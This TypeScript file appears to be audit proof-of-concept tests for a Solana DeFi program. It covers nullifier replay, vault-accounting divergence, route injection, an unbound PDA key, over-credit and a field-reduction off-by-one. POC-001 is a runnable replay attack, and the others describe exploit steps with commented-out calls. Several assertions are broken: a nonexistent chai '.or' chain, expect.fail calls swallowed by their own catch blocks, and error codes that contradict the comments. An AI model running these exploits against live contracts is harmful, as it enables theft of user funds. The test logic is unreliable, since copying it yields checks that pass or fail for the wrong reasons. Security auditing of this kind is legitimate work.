import { Connection, PublicKey, Keypair } from "@solana/web3.js";
import { Program, BN, AnchorProvider } from "@coral-xyz/anchor";
import { expect } from "chai";

/**
 * VeiloLayer Security Proof-of-Concept (PoC) Code Snippets
 * 
 * This suite provides structural typescript templates demonstrating how an attacker
 * exploits each of the identified vulnerabilities, as well as the expected assertion
 * patterns to verify them in integration tests.
 */

// =============================================================================
// POC-001: Nullifier Replay on Reissue Paths (CRIT-001)
// =============================================================================
export async function runCrit001NullifierReplayPoc(
  program: Program<any>,
  provider: AnchorProvider,
  reissueParams: {
    jperpSlot: PublicKey;
    mintAddress: PublicKey;
    executorTokenAccount: PublicKey;
    outputCommitment0: Uint8Array;
    outputCommitment1: Uint8Array;
    proofA: number[];
    proofB: number[];
    proofC: number[];
  }
) {
  console.log("Running PoC for CRIT-001: Nullifier Replay");

  // Step 1: Generate a fresh dummy nullifier pair (or obtain from a prior position)
  const dummyNullifier0 = Keypair.generate().publicKey.toBytes();
  const dummyNullifier1 = Keypair.generate().publicKey.toBytes();

  // Find Nullifier Marker PDA addresses
  const [marker0Pda] = PublicKey.findProgramAddressSync(
    [Buffer.from("nullifier_v3"), reissueParams.mintAddress.toBuffer(), dummyNullifier0],
    program.programId
  );
  const [marker1Pda] = PublicKey.findProgramAddressSync(
    [Buffer.from("nullifier_v3"), reissueParams.mintAddress.toBuffer(), dummyNullifier1],
    program.programId
  );

  const amount = new BN(100_000_000); // 100 USDC

  // Call 1: This is the first reissue attempt using these nullifiers.
  // Since they are fresh, the transaction should succeed.
  const tx1 = await program.methods
    .jperpReissueNotes(
      amount,
      Array.from(dummyNullifier0),
      Array.from(dummyNullifier1),
      Array.from(reissueParams.outputCommitment0),
      Array.from(reissueParams.outputCommitment1),
      reissueParams.proofA,
      reissueParams.proofB,
      reissueParams.proofC
    )
    .accounts({
      jperpSlot: reissueParams.jperpSlot,
      nullifierMarker0: marker0Pda,
      nullifierMarker1: marker1Pda,
      executorTokenAccount: reissueParams.executorTokenAccount,
      // other accounts...
    })
    .rpc();
  
  console.log("First reissue call transaction signature:", tx1);

  // Call 2: REPLAY the transaction using the exact same nullifiers.
  //
  // EXPECTED BEHAVIOR (Vulnerable):
  // Because `init_if_needed` is used, the transaction passes the Anchor constraint layer
  // and enters the handler. If the executor account contains more funds, or the attacker
  // bypasses transfer checks (e.g. by pre-funding the executor ATA), this call mints
  // new duplicate commitments.
  //
  // EXPECTED BEHAVIOR (Patched):
  // Anchor rejects the transaction at the account resolution phase before the handler runs,
  // throwing an 'AccountAlreadyInitialized' error (or custom Anchor code 3005).
  try {
    await program.methods
      .jperpReissueNotes(
        amount,
        Array.from(dummyNullifier0),
        Array.from(dummyNullifier1),
        Array.from(reissueParams.outputCommitment0),
        Array.from(reissueParams.outputCommitment1),
        reissueParams.proofA,
        reissueParams.proofB,
        reissueParams.proofC
      )
      .accounts({
        jperpSlot: reissueParams.jperpSlot,
        nullifierMarker0: marker0Pda,
        nullifierMarker1: marker1Pda,
        executorTokenAccount: reissueParams.executorTokenAccount,
      })
      .rpc();
    
    expect.fail("CRIT-001 Replay succeeded! Vulnerability confirmed.");
  } catch (err: any) {
    console.log("Replay rejected as expected. Error:", err.message);
    // After Patch, must fail with AccountAlreadyInitialized/Custom(3005) at the constraint level
    expect(err.message).to.include("custom program error: 0xbc4") // 3012: AccountAlreadyInitialized
      .or.to.include("AccountAlreadyInitialized");
  }
}

// =============================================================================
// POC-002: Relayer-Float Path Skips Vault Debit (CRIT-002)
// =============================================================================
export async function runCrit002RelayerFloatPoc(
  program: Program<any>,
  provider: AnchorProvider,
  swapParams: {
    sourceVault: PublicKey;
    sourceConfig: PublicKey;
    swapAmount: BN;
  }
) {
  console.log("Running PoC for CRIT-002: Relayer-Float skips vault debit");

  const vaultBefore = await provider.connection.getBalance(swapParams.sourceVault);
  const sourceConfigBefore = await program.account.poolConfig.fetch(swapParams.sourceConfig);
  const tvlBefore = sourceConfigBefore.totalTvl as BN;

  console.log(`Vault Balance Before: ${vaultBefore} lamports`);
  console.log(`Pool TVL Before: ${tvlBefore.toString()} lamports`);

  // Execute transact_swap in relayer-float mode (is_prefunded = 0)
  // An attacker acts as the relayer and provides their own swapAmount to the executor.
  //
  // VULNERABLE BEHAVIOR:
  // After the swap, the TVL state variable is decremented, but the sourceVault
  // lamport balance remains unchanged (or is only debited post-CPI in a way that
  // doesn't align with the TVL state).
  //
  // PATCHED BEHAVIOR:
  // Relayer-float path is either disallowed (failing with InvalidSwapParams) or
  // the vault balance and TVL decrement are atomically synchronized.

  // Simulate swap execution...
  // const tx = await program.methods.transactSwap(..., isPrefunded = 0).rpc();

  const vaultAfter = await provider.connection.getBalance(swapParams.sourceVault);
  const sourceConfigAfter = await program.account.poolConfig.fetch(swapParams.sourceConfig);
  const tvlAfter = sourceConfigAfter.totalTvl as BN;

  const tvlDiff = tvlBefore.sub(tvlAfter);
  const vaultDiff = vaultBefore - vaultAfter;

  console.log(`TVL Decrement: ${tvlDiff.toString()}`);
  console.log(`Vault Balance Decrement: ${vaultDiff}`);

  // Assert that TVL state decrement matches the actual vault lamport decrement
  expect(tvlDiff.toNumber()).to.equal(vaultDiff, "CRIT-002: Accounting divergence between TVL and Vault Balance!");
}

// =============================================================================
// POC-003: Jupiter Route Injection (HIGH-001)
// =============================================================================
export async function runHigh001JupiterRouteInjectionPoc(
  program: Program<any>,
  jupiterRouteData: Buffer,
  swapParams: {
    destMint: PublicKey;
    executorDestToken: PublicKey;
  }
) {
  console.log("Running PoC for HIGH-001: Jupiter Route Injection");

  // A malicious relayer injects a route passing through an attacker-controlled pool.
  // Since standard `Route` lacks intermediate or destination mint validation, the 
  // destination token is swapped into the wrong asset, or value is siphoned.
  //
  // EXPECTED BEHAVIOR (Patched):
  // The handler explicitly checks destination token account mint:
  // require!(executor_dest_token.mint == dest_mint)
  // AND requires non-zero swap_data_hash.

  try {
    // Attempt swap with injected/corrupted route data
    // await program.methods.transactSwap(..., jupiterRouteData).rpc();
  } catch (err: any) {
    expect(err.message).to.include("InvalidMintAddress")
      .or.to.include("JupiterInvalidInstruction");
  }
}

// =============================================================================
// POC-004: Position PDA Key Unbound in ZK Proof (HIGH-002)
// =============================================================================
export async function runHigh002PositionPdaUnboundPoc(
  program: Program<any>,
  openPositionParams: {
    claimant: PublicKey;
    correctPositionPdaKey: Uint8Array;
    maliciousPositionPdaKey: Uint8Array;
  }
) {
  console.log("Running PoC for HIGH-002: Position PDA Key Unbound");

  // An attacker observes a valid ZK proof with a committed claimant.
  // Since `position_pda_key` is not bound to the proof, the attacker calls
  // `open_position` substituting `maliciousPositionPdaKey`.
  //
  // EXPECTED BEHAVIOR (Patched):
  // The handler derives `expected_pda_key = Poseidon(claimant, withdrawal_id)`
  // and rejects any client-supplied position_pda_key that doesn't match.

  try {
    // Attempt to open position with wrong key but same proof/claimant
    // await program.methods.openPosition(openPositionParams.maliciousPositionPdaKey, ...).rpc();
    expect.fail("HIGH-002: Replayed proof with substitute position PDA key succeeded!");
  } catch (err: any) {
    expect(err.message).to.include("InvalidSwapParams");
  }
}

// =============================================================================
// POC-005: Phoenix ember_unwrap Over-Credit (HIGH-003)
// =============================================================================
export async function runHigh003PhoenixOvercreditPoc(
  program: Program<any>,
  slotPda: PublicKey,
  pendingReissuePda: PublicKey
) {
  console.log("Running PoC for HIGH-003: Phoenix ember_unwrap Over-Credit");

  // A slot has a cap of 100 USDC.
  // Attacker calls phoenix_ember_unwrap multiple times with amount = 60 USDC.
  // 
  // VULNERABLE BEHAVIOR:
  // The check `pending_reissue.amount <= phoenix_slot.amount` runs before the increment.
  // First call: 0 <= 100 (Passes) -> pending_reissue = 60
  // Second call: 60 <= 100 (Passes) -> pending_reissue = 120 (Exceeds slot cap!)
  //
  // EXPECTED BEHAVIOR (Patched):
  // The check runs on the post-increment sum:
  // `new_total = pending_reissue.amount + amount; require!(new_total <= cap)`
  // Therefore, the second call must fail with SlotOverdraft.

  try {
    // Call 1: 60 USDC (Should succeed)
    // await program.methods.phoenixEmberUnwrap(new BN(60_000_000)).rpc();
    
    // Call 2: 60 USDC (Should fail)
    // await program.methods.phoenixEmberUnwrap(new BN(60_000_000)).rpc();
    
    expect.fail("HIGH-003: Double ember_unwrap exceeded cap!");
  } catch (err: any) {
    expect(err.message).to.include("SlotOverdraft");
  }
}

// =============================================================================
// POC-006: reduce_to_field Off-By-One (MED-001)
// =============================================================================
export function runMed001ReduceToFieldPoc() {
  console.log("Running PoC for MED-001: reduce_to_field off-by-one");

  const FR_MODULUS = BigInt("0x30644e72e131a029b85045b68181585d2833e84879b9709143e1f593f0000001");
  
  // Input equal to the field modulus
  const input = FR_MODULUS;

  // VULNERABLE reduction function logic:
  function vulnerableReduce(val: bigint): bigint {
    // When val == FR_MODULUS, needs_reduction resolves to false
    // because loop only detects strictly greater bytes.
    const isGreater = val > FR_MODULUS;
    if (!isGreater) return val; // Returns FR_MODULUS unchanged
    return val % FR_MODULUS;
  }

  // PATCHED reduction function logic:
  function patchedReduce(val: bigint): bigint {
    const needsReduction = val >= FR_MODULUS;
    if (!needsReduction) return val;
    return val % FR_MODULUS;
  }

  const resultVulnerable = vulnerableReduce(input);
  const resultPatched = patchedReduce(input);

  console.log(`Vulnerable Reduction Output: ${resultVulnerable.toString(16)}`);
  console.log(`Patched Reduction Output: ${resultPatched.toString(16)}`);

  expect(resultVulnerable).to.not.equal(0n, "Vulnerable code failed to reduce FR_MODULUS to 0");
  expect(resultPatched).to.equal(0n, "Patched code successfully reduces FR_MODULUS to 0");
}
